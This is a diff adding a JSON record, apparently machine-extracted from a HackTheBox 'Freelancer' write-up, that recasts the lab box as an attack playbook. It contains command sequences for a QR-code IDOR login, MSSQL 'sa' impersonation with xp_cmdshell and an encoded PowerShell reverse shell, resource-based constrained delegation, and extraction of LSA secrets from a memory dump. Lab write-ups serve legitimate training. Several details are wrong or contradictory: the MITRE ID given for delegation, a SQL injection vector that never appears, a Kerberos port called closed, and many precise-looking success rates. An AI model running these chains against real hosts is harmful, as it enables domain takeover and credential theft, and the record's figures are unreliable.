@@ -1,0 +1,1066 @@
+{
+  "writeup_id": "Htb_Freelancer",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_domain_controller_web_mssql_hybrid",
+    "primary_services": [
+      "http",
+      "mssql",
+      "ldap",
+      "smb",
+      "dns",
+      "kerberos"
+    ],
+    "port_signature": "53+80+88+389+445+5985+55297",
+    "service_combination": "http+mssql+ldap+smb+winrm",
+    "os_family": "windows_server",
+    "environment_type": "active_directory_with_web_services",
+    "entry_vector": "web_application_idor",
+    "privilege_path": "web_to_mssql_to_domain_admin",
+    "attack_complexity": "hard",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "django_web_application",
+      "qr_code_authentication",
+      "mssql_impersonation_enabled",
+      "memory_dump_analysis_required",
+      "resource_based_constrained_delegation"
+    ],
+    "environmental_clues": [
+      "domain_controller_role",
+      "mssql_on_non_standard_port",
+      "nginx_reverse_proxy",
+      "freelancer_business_context",
+      "lsa_secrets_in_memory"
+    ],
+    "similar_scenarios": [
+      "blackfield_htb_hard",
+      "forest_htb_easy"
+    ],
+    "unique_aspects": [
+      "django_to_mssql_chain",
+      "qr_code_idor_vulnerability",
+      "memprocfs_memory_analysis",
+      "genericwrite_rbcd_exploitation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "IDOR_QR_Login",
+        "success_reason": "QR code login system allowed direct object reference manipulation",
+        "prerequisite_indicators": [
+          "qr_code_login_available",
+          "sequential_or_predictable_identifiers",
+          "insufficient_access_controls"
+        ],
+        "recognition_patterns": [
+          "QR code authentication endpoints",
+          "numeric IDs in login URLs",
+          "admin account enumeration possible"
+        ],
+        "failure_modes": [
+          "proper_session_validation",
+          "randomized_tokens",
+          "rate_limiting_enabled"
+        ],
+        "environmental_factors": [
+          "django_web_application",
+          "custom_authentication_system",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "MSSQL_Impersonation",
+        "success_reason": "Service account had impersonation privileges to sa account",
+        "prerequisite_indicators": [
+          "mssql_service_accessible",
+          "impersonation_permissions_exist",
+          "xp_cmdshell_can_be_enabled"
+        ],
+        "recognition_patterns": [
+          "EXECUTE AS LOGIN permissions",
+          "sa account impersonation possible",
+          "xp_cmdshell configuration access"
+        ],
+        "failure_modes": [
+          "impersonation_disabled",
+          "xp_cmdshell_blocked",
+          "insufficient_sql_privileges"
+        ],
+        "environmental_factors": [
+          "legacy_mssql_configuration",
+          "service_account_over_privileged",
+          "default_sql_server_settings"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Memory_Dump_Analysis",
+        "success_reason": "LSA Secrets contained plaintext credentials in memory dump",
+        "prerequisite_indicators": [
+          "memory_dump_file_accessible",
+          "lsa_secrets_present",
+          "credentials_in_memory"
+        ],
+        "recognition_patterns": [
+          ".dmp files on filesystem",
+          "MemProcFS analysis reveals secrets",
+          "LSA process memory contains passwords"
+        ],
+        "failure_modes": [
+          "encrypted_memory_dump",
+          "credentials_not_cached",
+          "insufficient_dump_privileges"
+        ],
+        "environmental_factors": [
+          "windows_credential_caching",
+          "debug_dumps_enabled",
+          "insufficient_memory_protection"
+        ],
+        "success_probability": 0.68,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "Resource_Based_Constrained_Delegation",
+        "success_reason": "User group had GenericWrite privileges over domain controller",
+        "prerequisite_indicators": [
+          "genericwrite_permissions_exist",
+          "domain_controller_accessible",
+          "kerberos_delegation_possible"
+        ],
+        "recognition_patterns": [
+          "BloodHound shows GenericWrite paths",
+          "msDS-AllowedToActOnBehalfOfOtherIdentity writable",
+          "computer account creation possible"
+        ],
+        "failure_modes": [
+          "delegation_restrictions_enabled",
+          "insufficient_ad_permissions",
+          "kerberos_hardening_applied"
+        ],
+        "environmental_factors": [
+          "active_directory_environment",
+          "default_delegation_settings",
+          "insufficient_privilege_separation"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-25 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Django website relationship abuse",
+        "discovery_method": "Web application enumeration",
+        "why_critical": "Led to initial foothold through IDOR vulnerability",
+        "how_to_recognize": [
+          "multiple django applications",
+          "shared authentication systems",
+          "cross-site functionality"
+        ],
+        "follow_up_actions": [
+          "enumerate_all_endpoints",
+          "test_cross_site_access",
+          "identify_admin_interfaces"
+        ]
+      },
+      {
+        "discovery": "MSSQL sa impersonation capability",
+        "discovery_method": "Database privilege enumeration",
+        "why_critical": "Enabled command execution through xp_cmdshell",
+        "how_to_recognize": [
+          "EXECUTE AS LOGIN permissions",
+          "sysadmin role membership",
+          "xp_cmdshell configuration access"
+        ],
+        "follow_up_actions": [
+          "enable_xp_cmdshell",
+          "test_command_execution",
+          "extract_database_credentials"
+        ]
+      },
+      {
+        "discovery": "Memory dump with LSA secrets",
+        "discovery_method": "File system enumeration",
+        "why_critical": "Contained plaintext credentials for privilege escalation",
+        "how_to_recognize": [
+          "*.dmp files present",
+          "memory analysis tools available",
+          "LSA process dumps"
+        ],
+        "follow_up_actions": [
+          "analyze_with_memprocfs",
+          "extract_lsa_secrets",
+          "test_credential_reuse"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application_user",
+        "escalation_method": "IDOR_to_admin_access",
+        "why_possible": "QR code login system lacked proper access controls",
+        "recognition_signs": [
+          "predictable_qr_identifiers",
+          "admin_account_enumerable",
+          "insufficient_session_validation"
+        ],
+        "exploitation_path": "IDOR QR Login → Admin Access → Database Access"
+      },
+      {
+        "privilege_level": "database_user",
+        "escalation_method": "SQL_impersonation_to_system",
+        "why_possible": "Service account could impersonate sa with xp_cmdshell access",
+        "recognition_signs": [
+          "impersonation_permissions_granted",
+          "xp_cmdshell_configurable",
+          "sa_account_accessible"
+        ],
+        "exploitation_path": "EXECUTE AS sa → Enable xp_cmdshell → System Commands"
+      },
+      {
+        "privilege_level": "local_user",
+        "escalation_method": "GenericWrite_RBCD_to_DA",
+        "why_possible": "User group had GenericWrite over domain controller object",
+        "recognition_signs": [
+          "bloodhound_shows_genericwrite",
+          "computer_account_creation_rights",
+          "delegation_attributes_writable"
+        ],
+        "exploitation_path": "GenericWrite → RBCD Configuration → DCSync → Domain Admin"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 and MSSQL on 55297 on Windows host",
+        "decision": "Identify as Domain Controller with web application and prioritize web enumeration first",
+        "reasoning": "Port combination indicates AD DC but HTTP on port 80 suggests web application attack surface which is often easier entry point than AD attacks without credentials",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "kerberos_enumeration",
+            "when": "if web application fails"
+          },
+          {
+            "option": "smb_enumeration",
+            "when": "if anonymous access available"
+          },
+          {
+            "option": "ldap_enumeration",
+            "when": "if anonymous bind allowed"
+          }
+        ],
+        "success_indicators": [
+          "web_application_accessible",
+          "django_framework_identified",
+          "user_registration_available"
+        ],
+        "next_decision": "web_application_enumeration"
+      },
+      {
+        "step": 2,
+        "situation": "Django web application with user registration and different account types",
+        "decision": "Create accounts and enumerate application functionality before attacking infrastructure",
+        "reasoning": "Web applications often have IDOR, privilege escalation, or credential disclosure vulnerabilities that provide easier path than infrastructure attacks",
+        "confidence": 0.85,
+        "prerequisites": [
+          "web_application_identified",
+          "registration_forms_available"
+        ],
+        "success_indicators": [
+          "accounts_created_successfully",
+          "authenticated_functionality_accessible",
+          "admin_panel_discovered"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "parameter_fuzzing",
+          "infrastructure_attacks"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Employer account requires activation, freelancer account works immediately",
+        "decision": "Focus on freelancer account functionality while investigating employer activation bypass",
+        "reasoning": "Active account provides immediate attack surface while inactive account suggests privilege separation that could be bypassed",
+        "confidence": 0.8,
+        "prerequisites": [
+          "multiple_account_types_identified"
+        ],
+        "success_indicators": [
+          "authenticated_features_enumerated",
+          "idor_vulnerabilities_found",
+          "activation_bypass_discovered"
+        ],
+        "failure_fallbacks": [
+          "contact_form_exploitation",
+          "admin_panel_access",
+          "credential_stuffing"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_app_succeeds": {
+        "action": "enumerate_authenticated_functionality",
+        "tools": [
+          "burp_suite",
+          "feroxbuster",
+          "manual_testing"
+        ],
+        "next_phase": "look_for_idor_and_privilege_escalation"
+      },
+      "if_web_app_fails": {
+        "action": "try_infrastructure_attacks",
+        "alternatives": [
+          "asreproast",
+          "kerberoasting",
+          "ldap_enumeration"
+        ],
+        "decision_criteria": "based_on_anonymous_access_level"
+      },
+      "if_credentials_obtained": {
+        "action": "test_credential_reuse",
+        "targets": [
+          "winrm_5985",
+          "mssql_55297",
+          "smb_445"
+        ],
+        "tools": [
+          "evil-winrm",
+          "impacket-mssqlclient",
+          "netexec"
+        ]
+      },
+      "if_mssql_access_gained": {
+        "action": "attempt_command_execution",
+        "methods": [
+          "xp_cmdshell",
+          "ole_automation",
+          "clr_integration"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_web_over_ad_when_both_present",
+        "reasoning": "web_applications_often_have_easier_initial_access_vectors",
+        "applicability": "mixed_infrastructure_with_web_services"
+      },
+      {
+        "rule": "test_account_activation_bypass_on_multi_tier_registration",
+        "reasoning": "privilege_separation_in_registration_often_bypassable",
+        "applicability": "multiple_account_types_with_different_privileges"
+      },
+      {
+        "rule": "test_credential_reuse_on_discovered_services",
+        "reasoning": "web_app_credentials_often_reused_on_infrastructure",
+        "applicability": "credentials_obtained_from_web_application"
+      },
+      {
+        "rule": "prioritize_mssql_xp_cmdshell_for_code_execution",
+        "reasoning": "common_misconfiguration_allowing_command_execution",
+        "applicability": "mssql_access_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "ASREPRoast",
+        "mitre_id": "T1558.004",
+        "required_services": [
+          "kerberos"
+        ],
+        "required_ports": [
+          88
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_domain",
+          "kerberos_authentication_enabled",
+          "accounts_without_preauth_exist"
+        ],
+        "success_indicators": [
+          "GetNPUsers_returns_hashes",
+          "domain_controller_accessible",
+          "service_accounts_present"
+        ],
+        "incompatible_with": [
+          "kerberos_disabled",
+          "all_accounts_require_preauth",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "service_account_naming_patterns",
+          "default_ad_configuration",
+          "legacy_exchange_services"
+        ],
+        "typical_success_rate": 0.3,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "IDOR_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "user_authentication_system",
+          "object_references_in_urls"
+        ],
+        "success_indicators": [
+          "sequential_ids_in_urls",
+          "predictable_object_references",
+          "insufficient_access_controls"
+        ],
+        "incompatible_with": [
+          "proper_authorization_checks",
+          "encrypted_object_references",
+          "session_based_access_only"
+        ],
+        "confidence_boosters": [
+          "django_framework_detected",
+          "admin_panels_present",
+          "qr_code_login_systems"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "MSSQL_Impersonation",
+        "mitre_id": "T1134.001",
+        "required_services": [
+          "mssql"
+        ],
+        "required_ports": [
+          1433,
+          55297
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "mssql_server_accessible",
+          "database_authentication_available",
+          "impersonation_permissions_exist"
+        ],
+        "success_indicators": [
+          "sa_account_accessible",
+          "xp_cmdshell_enableable",
+          "impersonation_context_available"
+        ],
+        "incompatible_with": [
+          "xp_cmdshell_permanently_disabled",
+          "strict_impersonation_controls",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "default_mssql_configuration",
+          "legacy_application_integration",
+          "elevated_service_account"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Resource_Based_Constrained_Delegation",
+        "mitre_id": "T1558.003",
+        "required_services": [
+          "kerberos",
+          "ldap"
+        ],
+        "required_ports": [
+          88,
+          389
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_domain",
+          "genericwrite_permissions_exist",
+          "computer_accounts_creatable"
+        ],
+        "success_indicators": [
+          "bloodhound_shows_genericwrite",
+          "msds_allowedtoactonbehalfofotheridentity_writable",
+          "domain_controller_accessible"
+        ],
+        "incompatible_with": [
+          "constrained_delegation_disabled",
+          "strict_computer_account_policies",
+          "kerberos_disabled"
+        ],
+        "confidence_boosters": [
+          "default_ad_permissions",
+          "legacy_group_memberships",
+          "insufficient_delegation_controls"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "20-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "active_directory": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          3268,
+          636,
+          3269,
+          9389
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns",
+          "adws"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "freelancer.htb"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "nginx",
+          "django"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "mssql_server": {
+        "port_indicators": [
+          1433,
+          55297
+        ],
+        "service_indicators": [
+          "ms-sql-s",
+          "mssql"
+        ],
+        "banner_indicators": [
+          "Microsoft SQL Server",
+          "SQLEXPRESS"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "web_application_enumeration",
+          "when": "http_service_detected",
+          "reason": "primary_attack_surface_with_idor_potential"
+        },
+        {
+          "attack": "mssql_exploitation",
+          "when": "mssql_service_detected_with_creds",
+          "reason": "high_privilege_escalation_potential"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "asreproast",
+          "when": "active_directory_detected",
+          "reason": "kerberos_port_closed_but_ad_present"
+        },
+        {
+          "attack": "smb_enumeration",
+          "when": "smb_service_detected",
+          "reason": "guest_disabled_but_worth_retry_with_creds"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ldap_enumeration",
+          "when": "ldap_service_detected",
+          "reason": "requires_authentication_first"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Insecure Direct Object Reference (IDOR)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "zbarimg",
+            "command_template": "zbarimg {qr_image_file}",
+            "actual_command": "zbarimg qrcode.png",
+            "output_pattern": "QR-Code:http://{domain}/accounts/login/otp/{encoded_id}/{token}/",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "curl",
+            "command_template": "curl -i '{qr_url}'",
+            "actual_command": "curl -i 'http://freelancer.htb/accounts/login/otp/MTAwMTA=/71c40e88da186a5d53afe78b585f1382/'",
+            "success_factors": [
+              "valid_token",
+              "unexpired_session",
+              "predictable_user_ids"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "qr_code_login_feature_available",
+          "predictable_user_identifiers",
+          "insufficient_access_controls"
+        ],
+        "success_indicators": [
+          "302_redirect_to_profile",
+          "session_cookie_set",
+          "access_to_privileged_account"
+        ],
+        "common_failures": [
+          "expired_tokens",
+          "unpredictable_user_ids",
+          "proper_authorization_checks"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "credential_harvesting"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "MSSQL Command Execution via xp_cmdshell",
+        "mitre_id": "T1059.001",
+        "category": "execution",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "mssqlclient.py",
+            "command_template": "mssqlclient.py {username}:{password}@{target} -windows-auth",
+            "actual_command": "mssqlclient.py sql_svc:password@10.10.11.5 -windows-auth",
+            "output_pattern": "SQL>",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "xp_cmdshell",
+            "command_template": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '{command}';",
+            "actual_command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
+            "success_factors": [
+              "sa_privileges",
+              "xp_cmdshell_enabled",
+              "impersonation_available"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "mssql_access",
+          "sa_account_privileges",
+          "xp_cmdshell_feature_available"
+        ],
+        "success_indicators": [
+          "command_execution_successful",
+          "system_level_access",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "xp_cmdshell_disabled",
+          "insufficient_privileges",
+          "network_restrictions"
+        ],
+        "follow_up_techniques": [
+          "credential_dumping",
+          "persistence_mechanisms",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Resource-Based Constrained Delegation",
+        "mitre_id": "T1558.003",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "BloodHound",
+            "command_template": "bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip}",
+            "actual_command": "bloodhound-python -u user -p password -d freelancer.htb -ns 10.10.11.5",
+            "output_pattern": "*.json files with AD relationships",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "rbcd.py",
+            "command_template": "rbcd.py -delegate-from {source_computer} -delegate-to {target_computer} -dc-ip {dc_ip} {domain}/{username}:{password}",
+            "actual_command": "rbcd.py -delegate-from FAKE$ -delegate-to DC$ -dc-ip 10.10.11.5 freelancer.htb/user:password",
+            "success_factors": [
+              "GenericWrite_privileges",
+              "computer_account_creation",
+              "delegation_rights"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "GenericWrite_privileges_on_target",
+          "ability_to_create_computer_accounts",
+          "kerberos_delegation_enabled"
+        ],
+        "success_indicators": [
+          "computer_account_created",
+          "delegation_configured",
+          "domain_admin_access_achieved"
+        ],
+        "common_failures": [
+          "insufficient_privileges",
+          "delegation_restrictions",
+          "computer_account_quota_exceeded"
+        ],
+        "follow_up_techniques": [
+          "dcsync_attack",
+          "golden_ticket_creation",
+          "persistence_establishment"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "Memory Dump Analysis with MemProcFS",
+        "mitre_id": "T1003.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "MemProcFS",
+            "command_template": "memprocfs.exe -device {dump_file} -mount {mount_point}",
+            "actual_command": "memprocfs.exe -device MEMORY.DMP -mount M:",
+            "output_pattern": "Virtual filesystem mounted",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "LSA Secrets extraction",
+            "command_template": "type {mount_point}\\forensic\\json\\lsasecrets.json",
+            "actual_command": "type M:\\forensic\\json\\lsasecrets.json",
+            "success_factors": [
+              "complete_memory_dump",
+              "lsa_secrets_present",
+              "readable_dump_format"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "memory_dump_file_access",
+          "MemProcFS_tool_available",
+          "sufficient_system_resources"
+        ],
+        "success_indicators": [
+          "dump_successfully_mounted",
+          "credentials_extracted",
+          "lsa_secrets_readable"
+        ],
+        "common_failures": [
+          "corrupted_dump_file",
+          "insufficient_memory",
+          "encrypted_credentials"
+        ],
+        "follow_up_techniques": [
+          "credential_validation",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "BloodHound",
+        "use_case": "active_directory_privilege_escalation_path_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "active_directory_environments"
+        ],
+        "alternatives": [
+          "manual_ldap_enumeration",
+          "powerview"
+        ],
+        "best_practices": [
+          "run_after_obtaining_domain_credentials",
+          "focus_on_GenericWrite_and_delegation_rights",
+          "validate_attack_paths_before_exploitation"
+        ]
+      },
+      {
+        "tool": "MemProcFS",
+        "use_case": "memory_dump_forensics_and_credential_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "memory_dump_analysis",
+          "credential_recovery"
+        ],
+        "alternatives": [
+          "volatility",
+          "rekall",
+          "windbg"
+        ],
+        "best_practices": [
+          "mount_to_dedicated_drive_letter",
+          "check_lsasecrets_json_first",
+          "validate_extracted_credentials"
+        ]
+      },
+      {
+        "tool": "zbarimg",
+        "use_case": "qr_code_decoding_for_idor_attacks",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "qr_code_analysis"
+        ],
+        "alternatives": [
+          "online_qr_decoders",
+          "mobile_apps"
+        ],
+        "best_practices": [
+          "decode_qr_codes_from_login_features",
+          "analyze_url_patterns_for_idor",
+          "test_parameter_manipulation"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "qr_code_idor_to_admin_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "zbarimg qrcode.png",
+            "purpose": "Decode QR code to extract login URL",
+            "expected_output": "QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTA=/71c40e88da186a5d53afe78b585f1382/"
+          },
+          {
+            "step": 2,
+            "command": "echo 'MTAwMTA=' | base64 -d",
+            "purpose": "Decode base64 user ID to understand pattern",
+            "expected_output": "10010"
+          },
+          {
+            "step": 3,
+            "command": "curl -i 'http://freelancer.htb/accounts/login/otp/MQ==/[token]/'",
+            "purpose": "Test IDOR with admin user ID (1 encoded as base64)",
+            "expected_output": "302 redirect with admin session cookie"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "mssql_impersonation_to_command_execution",
+        "steps": [
+          {
+            "step": 1,
+            "command": "mssqlclient.py sql_svc:password@10.10.11.5 -windows-auth",
+            "purpose": "Connect to MSSQL with discovered credentials",
+            "expected_output": "SQL> prompt"
+          },
+          {
+            "step": 2,
+            "command": "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');",
+            "purpose": "Check current privileges",
+            "expected_output": "Current user and sysadmin status"
+          },
+          {
+            "step": 3,
+            "command": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;",
+            "purpose": "Impersonate sa account",
+            "expected_output": "sa user context"
+          },
+          {
+            "step": 4,
+            "command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+            "purpose": "Enable xp_cmdshell",
+            "expected_output": "Configuration updated"
+          },
+          {
+            "step": 5,
+            "command": "EXEC xp_cmdshell 'powershell -e [base64_payload]';",
+            "purpose": "Execute reverse shell payload",
+            "expected_output": "Command execution and shell callback"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-15 minutes"
+      },
+      {
+        "sequence_name": "memory_dump_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "memprocfs.exe -device MEMORY.DMP -mount M:",
+            "purpose": "Mount memory dump as virtual filesystem",
+            "expected_output": "MemProcFS mounted successfully"
+          },
+          {
+            "step": 2,
+            "command": "type M:\\forensic\\json\\lsasecrets.json",
+            "purpose": "Extract LSA secrets containing credentials",
+            "expected_output": "JSON with credential data"
+          },
+          {
+            "step": 3,
+            "command": "echo [extracted_password] | base64 -d",
+            "purpose": "Decode any base64 encoded passwords",
+            "expected_output": "Cleartext password"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Freelancer",
+      "difficulty": "Hard",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2024-06-01",
+      "author": "Spectra199",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "web_application",
+        "sql_injection",
+        "active_directory",
+        "memory_analysis"
+      ],
+      "key_vulnerabilities": [
+        "idor",
+        "sql_impersonation",
+        "rbcd",
+        "credential_exposure"
+      ],
+      "environment_type": "corporate_domain_controller_with_web_services",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "django_exploitation",
+        "mssql_impersonation",
+        "memory_forensics",
+        "rbcd_attacks",
+        "bloodhound_analysis"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "sql_server_administration",
+        "active_directory_concepts",
+        "memory_analysis_tools"
+      ]
+    },
+    "categorization": {
+      "primary_category": "multi_stage_exploitation",
+      "subcategories": [
+        "web_application_security",
+        "database_exploitation",
+        "active_directory",
+        "memory_forensics"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "secure_web_development",
+        "database_hardening",
+        "memory_protection",
+        "ad_delegation_controls"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Blackfield",
+        "Cascade",
+        "Intelligence"
+      ],
+      "similarity_reasons": [
+        "memory_dump_analysis",
+        "ad_privilege_escalation",
+        "multi_stage_attack_chain"
+      ],
+      "unique_aspects": [
+        "django_idor_exploitation",
+        "mssql_sa_impersonation",
+        "qr_code_authentication_bypass",
+        "memprocfs_analysis"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "memory_analysis_required",
+        "multiple_pivot_points",
+        "advanced_ad_exploitation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T00:47:09.308342",
+    "original_file": "0xdf_writeups/Htb Freelancer.md",
+    "content_length": 114036,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
